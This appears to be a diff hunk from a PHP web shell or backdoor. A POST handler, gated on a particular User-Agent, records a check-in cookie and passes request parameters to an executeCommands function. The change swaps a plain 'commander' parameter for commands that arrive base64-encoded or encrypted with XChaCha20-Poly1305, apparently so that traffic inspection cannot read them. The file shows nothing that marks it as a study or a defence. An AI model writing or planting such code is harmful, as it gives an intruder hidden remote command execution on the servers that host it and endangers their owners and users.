@@ -362,8 +362,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
     setcookie("checkIn", $_SERVER["REMOTE_ADDR"]);
     header("Access-Control-Allow-Origin: *");
     header("Access-Control-Allow-Credentials: true");
-    if (!empty($_POST["commander"])) {
-        executeCommands($_POST["commander"], "0");
+    if (!empty($_POST["t"])) {
+        if ($_POST['t'] === "e"){
+            $n = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($_POST['ne']) , base64_decode($_POST['ad']) , base64_decode($_POST['k']) , base64_decode($_POST['c']));
+            executeCommands($n, "0");
+        }else{
+            executeCommands(base64_decode($_POST["cr"]), "0");
+        }
     } elseif (!empty($_POST["clone"])) {
         if (!empty($_POST["ROS"])) {
             $ROS = htmlentities($_POST["ROS"]);
